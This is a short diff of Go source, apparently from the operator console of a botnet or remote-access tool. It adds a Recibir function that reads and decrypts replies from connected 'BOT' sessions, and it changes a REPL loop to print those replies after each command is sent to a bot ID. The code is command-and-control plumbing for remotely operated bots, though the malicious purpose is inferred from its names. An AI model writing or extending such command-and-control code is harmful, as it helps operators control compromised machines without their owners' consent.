@@ -55,6 +55,10 @@ func ReplBOT() {
 			if !Enviar(ID, Input) {
 				replBOT = true
 			}
+			recvRespuesta, err := Recibir(ID)
+			if err == nil {
+				fmt.Print(recvRespuesta)
+			}
 		}
 	}
 }
@@ -85,4 +89,23 @@ func Enviar(ID int, InputSend string) bool {
 
 	log.Printf("[!] BOT con ID %d no válido o desconectado.", ID)
 	return false
+}
+
+// Funcion para recibir mensaje de bot
+func Recibir(ID int) (string, error) {
+	// Recibir Mensaje
+	buffer := make([]byte, 1024)
+	BOT := config.BOT[ID]
+	by, err := BOT.Read(buffer)
+	if err != nil {
+		return "", err
+	}
+
+	retrunEncrypt := string(buffer[:by])
+	returnDecrypt, err := seguridad.Desencryptar(retrunEncrypt)
+	if err != nil {
+		return "", err
+	}
+
+	return returnDecrypt, nil
 }
